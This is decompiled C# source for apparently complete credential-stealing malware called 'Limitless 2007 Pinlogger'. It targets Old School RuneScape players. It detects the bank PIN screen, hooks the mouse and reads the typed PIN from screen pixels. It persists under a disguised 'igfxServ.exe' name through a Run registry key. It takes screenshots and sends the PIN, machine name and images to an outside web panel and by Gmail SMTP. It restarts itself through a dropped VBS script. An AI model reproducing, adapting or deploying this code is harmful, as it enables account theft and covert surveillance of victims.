using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class PinFinder
{
	public struct WinIdentifier
	{
		public IntPtr WindowFrame;

		public string WindowWords;
	}

	public static WebPanelPostClass PostToWebPanel = new WebPanelPostClass();

	public static int PinClicks = 1;

	public static bool StopScanningForRS = false;

	public static bool RSFound = false;

	public static bool NextKey = true;

	public static bool BankFound = false;

	public static double ColorPoint1;

	public static double ColorPoint2;

	public static string FinalPin;

	public static Point ScreenshotStartLocation = default(Point);

	public static Rectangle ScreenDimensions = Screen.get_PrimaryScreen().get_Bounds();

	private const string Win1 = "old school runescape";

	private const string Proc1 = "java";

	public static bool SendToPanel = true;

	public static bool SendToEmail = true;

	public static bool ConfirmRun = true;

	public static MouseHook MH = new MouseHook();

	public static string Pin;

	public static Rectangle ScreenRectangle
	{
		get
		{
			return ScreenDimensions;
		}
		set
		{
			ScreenDimensions = value;
		}
	}

	[DllImport("user32.dll")]
	public static extern short GetAsyncKeyState(Keys vKey);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hwnd, StringBuilder lpWhite, int namco);

	[STAThread]
	public static void Main()
	{
		try
		{
			MouseHook.UnhookMouse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread = new Thread(SearchForWindow1);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread2 = new Thread(StartWithWindows);
			thread2.Priority = ThreadPriority.AboveNormal;
			thread2.IsBackground = true;
			thread2.Start();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (ConfirmRun)
		{
			try
			{
				Thread thread3 = new Thread(Confirmation);
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = true;
				thread3.Start();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			MouseHook.HookMouse();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void StartWithWindows()
	{
		string name = "loginServer";
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\igfxServ.exe";
		try
		{
			if (!File.Exists(text))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text, overwrite: true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(name, text);
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void Confirmation()
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\True"))
		{
			if (SendToEmail)
			{
				SendInfoToEmail("example@gmail.com", "password", "smtp.gmail.com", 587, "Limitless 2007 Pinlogger Successfully Ran On: " + ((ServerComputer)MyProject.Computer).get_Name().ToString(), "The 2007 PinLogger Has Successfully Ran On: " + ((ServerComputer)MyProject.Computer).get_Name().ToString() + Environment.NewLine + "You Should Recieve A Pin When They Type It In!", SS: false, Restart: false);
			}
			else if (SendToPanel)
			{
				SendInfoToPanel("example@gmail.com", "Limitless 2007 Pinlogger Successfully Ran On: " + ((ServerComputer)MyProject.Computer).get_Name().ToString(), "The 2007 PinLogger Has Successfully Ran On: " + ((ServerComputer)MyProject.Computer).get_Name().ToString() + Environment.NewLine + "You Should Recieve A Pin When They Type It In!", SS: false, Restart: false);
			}
			try
			{
				File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\True");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void SearchForWindow1()
	{
		while (true)
		{
			if (!WinText().WindowWords.ToLower().Contains("old school runescape"))
			{
				RSFound = false;
			}
			else
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (Operators.CompareString(process.ProcessName.ToLower(), "java", false) == 0)
					{
						Console.WriteLine("RS Found");
						Thread thread = new Thread(ScanForBank);
						thread.IsBackground = true;
						thread.Priority = ThreadPriority.AboveNormal;
						thread.Start();
						try
						{
							SearchForWindow2();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						RSFound = true;
						return;
					}
				}
			}
			Thread.Sleep(100);
		}
	}

	public static void SearchForWindow2()
	{
		while (!StopScanningForRS)
		{
			if (WinText().WindowWords.ToLower().Contains("old school runescape"))
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (Operators.CompareString(process.ProcessName.ToLower(), "java", false) == 0)
					{
						RSFound = true;
					}
				}
			}
			else
			{
				RSFound = false;
			}
			Thread.Sleep(100);
		}
	}

	public static void ScanForBank()
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		checked
		{
			Rectangle screenRectangle;
			while (true)
			{
				if (!RSFound)
				{
					continue;
				}
				try
				{
					Size size = new Size(SystemInformation.get_VirtualScreen().Width, SystemInformation.get_VirtualScreen().Height);
					int height = SystemInformation.get_VirtualScreen().Height;
					screenRectangle = SystemInformation.get_VirtualScreen();
					Bitmap val = new Bitmap(height, screenRectangle.Width);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Point point = new Point(0, 0);
					Point point2 = new Point(0, 0);
					val2.CopyFromScreen(point, point2, size);
					double num = ((Image)val).get_Width() - 1;
					double num2 = 40.0;
					while (num2 <= num)
					{
						double num3 = ((Image)val).get_Height() - 1;
						double num4 = 130.0;
						while (true)
						{
							if (num4 <= num3)
							{
								if (!(val.GetPixel((int)Math.Round(num2), (int)Math.Round(num4)) == Color.FromArgb(37, 37, 34)) || !(val.GetPixel((int)Math.Round(num2 + 8.0), (int)Math.Round(num4 + 10.0)) == Color.FromArgb(255, 0, 0)))
								{
									num4 += 1.0;
									continue;
								}
								ColorPoint1 = num2;
								ColorPoint2 = num4;
								goto end_IL_0000;
							}
							num2 += 1.0;
							break;
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(100);
				continue;
				end_IL_0000:
				break;
			}
			StopScanningForRS = true;
			ScreenshotStartLocation = new Point((int)Math.Round(ColorPoint1 - 1.0), (int)Math.Round(ColorPoint2 - 1.0));
			Console.WriteLine("Bank Found");
			Point screenshotStartLocation = ScreenshotStartLocation;
			Size size2 = new Size(489, 305);
			screenRectangle = new Rectangle(screenshotStartLocation, size2);
			ScreenRectangle = screenRectangle;
			try
			{
				MouseHook.BFound();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static WinIdentifier WinText()
	{
		StringBuilder stringBuilder = new StringBuilder(255);
		int num = (stringBuilder.Length = GetWindowText(GetForegroundWindow(), stringBuilder, checked(stringBuilder.Capacity + 1)));
		WinIdentifier result = default(WinIdentifier);
		result.WindowWords = stringBuilder.ToString();
		result.WindowFrame = GetForegroundWindow();
		return result;
	}

	public static void StartP(Bitmap img1, Bitmap img2, Bitmap img3, Bitmap img4)
	{
		_ = Environment.NewLine;
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			stringBuilder.Append("(" + ParseDigits(img1) + ")(" + ParseDigits(img2) + ")(" + ParseDigits(img3) + ")(" + ParseDigits(img4) + ")");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Console.WriteLine(stringBuilder);
		Pin = stringBuilder.ToString();
		if (SendToPanel)
		{
			SendInfoToPanel("example@gmail.com", "Limitless PinLog From: " + Environment.MachineName, "Pinlog From: " + ((ServerComputer)MyProject.Computer).get_Name().ToString() + " at: " + DateTime.Today.ToString() + Environment.NewLine + Environment.NewLine + "Pin: " + Pin, SS: true, Restart: true);
		}
		if (SendToEmail)
		{
			SendInfoToEmail("example@gmail.com", "password", "smtp.gmail.com", 587, "Limitless PinLog From: " + Environment.MachineName, "Pinlog From: " + ((ServerComputer)MyProject.Computer).get_Name().ToString() + " at: " + DateTime.Today.ToString() + Environment.NewLine + Environment.NewLine + "Pin: " + Pin, SS: true, Restart: true);
		}
	}

	public static string ParseDigits(Bitmap ParseBitmap)
	{
		checked
		{
			int num = GetItem(21, 83, ParseBitmap) + GetItem(115, 83, ParseBitmap) + GetItem(209, 83, ParseBitmap) + GetItem(293, 83, ParseBitmap) + GetItem(21, 156, ParseBitmap) + GetItem(115, 155, ParseBitmap) + GetItem(209, 155, ParseBitmap) + GetItem(21, 227, ParseBitmap) + GetItem(115, 227, ParseBitmap) + GetItem(209, 227, ParseBitmap);
			if (45 - num == -2)
			{
				return "3/5";
			}
			return Conversions.ToString(57 - num);
		}
	}

	public static int GetItem(int InitialX, int InitialY, Bitmap ReadImage)
	{
		int num = 0;
		checked
		{
			int num2 = InitialX + 63;
			for (int i = InitialX; i <= num2; i++)
			{
				int num3 = InitialY + 63;
				for (int j = InitialY; j <= num3; j++)
				{
					if (ReadImage.GetPixel(i, j) == Color.FromArgb(255, 127, 0))
					{
						num++;
					}
				}
			}
			return num switch
			{
				24 => 7, 
				27 => 1, 
				29 => 2, 
				30 => 10, 
				31 => 4, 
				34 => 9, 
				36 => 6, 
				37 => 8, 
				44 => 0, 
				_ => 0, 
			};
		}
	}

	public static void SendInfoToEmail(string Email, string Pass, string Smtp, int Port, string Subject, string Body, bool SS, bool Restart)
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		try
		{
			SmtpClient smtpClient = new SmtpClient(Smtp);
			MailMessage mailMessage = new MailMessage();
			Random random = new Random();
			string text = random.Next(1, 7).ToString();
			MailMessage mailMessage2 = mailMessage;
			mailMessage2.Body = Body;
			mailMessage2.From = new MailAddress(Email);
			mailMessage2.Subject = Subject;
			mailMessage2.To.Add(Email);
			if (SS)
			{
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Path.GetTempPath() + "Bank" + text + ".png");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Attachment item = new Attachment(Path.GetTempPath() + "Bank" + text + ".png");
				mailMessage2.Attachments.Add(item);
			}
			mailMessage2 = null;
			SmtpClient smtpClient2 = smtpClient;
			smtpClient2.Credentials = new NetworkCredential(Email, Pass);
			smtpClient2.EnableSsl = true;
			smtpClient2.Port = Port;
			smtpClient2.Send(mailMessage);
			smtpClient2 = null;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Restart)
		{
			Thread thread = new Thread(Update);
			thread.Start();
		}
	}

	public static void SendInfoToPanel(string Username, string Title, string Content, bool SS, bool Restart)
	{
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		try
		{
			Random random = new Random();
			StringBuilder stringBuilder = new StringBuilder();
			string text = random.Next(1, 7).ToString();
			stringBuilder.Append("content=" + Content);
			stringBuilder.Append("&user=" + Username);
			stringBuilder.Append("&title=" + Title);
			if (SS)
			{
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Path.GetTempPath() + "Bank" + text + ".png");
					WebPanelPostClass webPanelPostClass = new WebPanelPostClass();
					string text2 = webPanelPostClass.UploadImageToPanel("http://www.limitlessproducts.org/Limitless/Login/upload.php", Path.GetTempPath() + "Bank" + text + ".png");
					stringBuilder.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/" + text2 + ".png");
					Conversions.ToString(webPanelPostClass.SendData(new Uri("http://www.limitlessproducts.org/Limitless/Login/submit_log.php"), WebPanelPostClass.RequestMethods.Post, stringBuilder));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				WebPanelPostClass webPanelPostClass2 = new WebPanelPostClass();
				stringBuilder.Append("&path=NA");
				Conversions.ToString(webPanelPostClass2.SendData(new Uri("http://www.limitlessproducts.org/Limitless/Login/submit_log.php"), WebPanelPostClass.RequestMethods.Post, stringBuilder));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Restart)
		{
			Thread thread = new Thread(Update);
			thread.Start();
		}
	}

	public static void Update()
	{
		try
		{
			string location = Assembly.GetExecutingAssembly().Location;
			string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("On Error Resume Next");
			stringBuilder.AppendLine("Const strComputer = \".\"");
			stringBuilder.AppendLine("  Dim objWMIService, colProcessList");
			stringBuilder.AppendLine("  Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")");
			stringBuilder.AppendLine("  Set colProcessList = objWMIService.ExecQuery(\"SELECT * FROM Win32_Process WHERE Name = '" + moduleName + "'\")");
			stringBuilder.AppendLine("  For Each objProcess in colProcessList");
			stringBuilder.AppendLine("    objProcess.Terminate()");
			stringBuilder.AppendLine("  Next");
			stringBuilder.AppendLine("WScript.Sleep 1000");
			stringBuilder.AppendLine("Dim oShell : Set oShell = CreateObject(\"WScript.Shell\")");
			stringBuilder.AppendLine("oShell.Run \"" + location + "\"");
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\select.vbs", stringBuilder.ToString());
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\select.vbs");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
